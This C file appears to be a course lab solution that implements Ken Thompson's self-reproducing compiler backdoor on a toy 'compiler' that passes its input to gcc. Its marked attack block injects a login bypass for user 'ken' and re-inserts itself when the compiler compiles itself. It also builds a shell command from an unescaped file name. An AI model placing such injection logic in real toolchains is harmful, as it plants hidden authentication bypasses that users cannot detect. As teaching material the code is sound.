#include "attack-array.h"
// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>


#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile: throw the input into a
// temporary file and then call gcc on the result.
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);

    // start attack code
    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    char new_program[4096];
    memset(new_program, '\0', 4096);
    strcpy(new_program, "#include \"attack-array.h\"\n");
    int new_prog_i = strlen(new_program);
    int i = 0;
    char* login_found;
    char* compile_found;
    if ((login_found = strstr(program, login_sig)) != NULL) {
      while (program + i != login_found) {
        new_program[new_prog_i] = program[i];
        i++;
        new_prog_i++;
      }
      new_program[new_prog_i] = '\0';
      strcat(new_program, login_sig);
      strcat(new_program, "\n");
      strcat(new_program, login_attack);
      strcat(new_program, login_found + strlen(login_sig));
      strcpy(program, new_program);
    }
    else if ((compile_found = strstr(program, compile_sig)) != NULL) {
      while (program + i != compile_found) {
        new_program[new_prog_i] = program[i];
        i++;
        new_prog_i++;
      }
      new_program[new_prog_i] = '\0';
      strcat(new_program, compile_sig);
      strcat(new_program, "\n");
      strcat(new_program, prog);
      strcat(new_program, compile_found + strlen(compile_sig));
      strcpy(program, new_program);
    }
    // end attack code
    fprintf(fp, "%s", program);
    fclose(fp);


    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}



#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");
    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
